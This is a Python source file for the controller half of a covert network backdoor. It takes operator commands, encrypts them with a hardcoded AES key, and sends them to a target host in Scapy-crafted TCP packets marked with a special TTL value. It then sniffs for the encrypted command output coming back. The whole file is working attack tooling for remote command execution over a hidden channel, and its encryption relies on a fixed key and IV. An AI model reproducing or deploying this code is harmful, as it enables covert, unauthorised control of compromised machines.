#  =================================================================
#  client.py
#  
#
#  
#  
#  
#  
#
#
#
#
#
#
#
#
#  
#  =================================================================

import time
import base64
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * #sudo apt-get install python-scapy
from subprocess import *
from Crypto.Cipher import AES
import ConfigParser

configParser = ConfigParser.RawConfigParser()
configPath = r'config.txt'
configParser.read(configPath)

##read config file and settings
key = configParser.get('config','password')
directory = configParser.get('config', 'fileDir')
srcIP = configParser.get('config', 'srcIP')
destIP = configParser.get('config', 'destIP')
srcPort = configParser.get('config', 'srcPort')

CONN_IPS = {}
MASTER_KEY = "EncryptDecryptDataSentByBackdoor"
SALT = "JstinPaulCabanez"

#  =================================================================
#  name: encryption
#  @param:
#		text 			- the plaintext that will be encrypted
#
#  @return
#		encryptedText 	- the encrypted plaintext
#
#  description: encrypts data given
#  =================================================================
def encryption(text):
	secretKey = AES.new(MASTER_KEY,AES.MODE_CFB, SALT)
	padding = (AES.block_size - len(str(text)) % AES.block_size) * "\0"
	plainTextWithPadding = str(text) + padding
	encryptedText = base64.b64encode(secretKey.encrypt(plainTextWithPadding))
  
	return encryptedText

#  =================================================================
#  name: decryption
#  @param:
#		encryptedText 	- the encrypted text that will be decrypted
#
#  @return
#		plainText 		- the decrypted text
#
#  description: decrypts encrypted data given
#  =================================================================
def decryption(encryptedText):
	missing_padding = len(encryptedText) % 4
	if missing_padding != 0:
		encryptedText += b'='* (4 - missing_padding)
	secretKey = AES.new(MASTER_KEY,AES.MODE_CFB, SALT)
	plainTextWithPadding = secretKey.decrypt(base64.b64decode(encryptedText))
	plainText = plainTextWithPadding.rstrip("\0")
  
	return plainText
	
#  =================================================================
#  name: verify_root
#  @param:
#		none
#  @return
#  		none
#
#  description: verify if the program is ran in root if not exit the program
#  =================================================================
def verify_root():
	if(os.getuid() != 0):
			exit("This program is not in root/sudo")
					
#  =================================================================
#  name: print_payload
#  @param
#		packet 	- packet received by the sniff
#
#  @return
#		none
#  			
#  description: receives a packet and prints the the payload
#  =================================================================
def print_payload(packet):
	try:
		data = packet['Raw'].load
		print(decryption(data))
	except IndexError:
		pass
		
#  =================================================================
#  name: sendpkt
#  @param:
#		packet 	- the packet that needs to be sent crafted by scapy
#  @return
#		none  
#
#  description: send packet to the location described in the packet
#  =================================================================
def sendpkt(packet):
	send(packet)
	
#  =================================================================
#  name: packetCheck
#  @param:
#		packet 	- a packet that is received by the sniff
#  @return
#		True 	- if packet is the right packet from the backdoor.py
#
#		False 	- if the packet is not the correct packet to be received
#
#  description: checks if the packet has the right format   
#  =================================================================	
def packetCheck(packet):
	if IP in packet[0] and Raw in packet[2]:
		if packet[IP].ttl == 188:
			return True
		else:
			return False

#  =================================================================
#  name: sendCmd
#  @param:
#		destIP 	- destination IP that the packet will be sent to
#
#		port 	- destination port the packet will sent through
#
#		cmd		- the encrypted command to send
#
#  @return
#		none
#  
#  description: crafts packet using scapy
#  =================================================================
def sendCmd(destIP, port , cmd):
	packet = IP(dst=destIP,ttl=188) / TCP(dport=8000) / Raw(load=cmd)
	sendpkt(packet)

#  =================================================================
#  name: main
#  @param
#		none
#  @return
#		none
#  
#  =================================================================
def main():
    verify_root()
    Sending = True
    
    while(1):
		if Sending:
			cmd = raw_input("Command to execute: ")
			cmd = encryption(cmd)
			sendCmd(destIP, srcPort, cmd)
			Sending = False
		else:
			sniff(filter="tcp", count=1, prn=print_payload, stop_filter=packetCheck)
			Sending = True
				
if __name__ == '__main__':
	try:
	   main()
	except KeyboardInterrupt:
			exit("Exiting....")
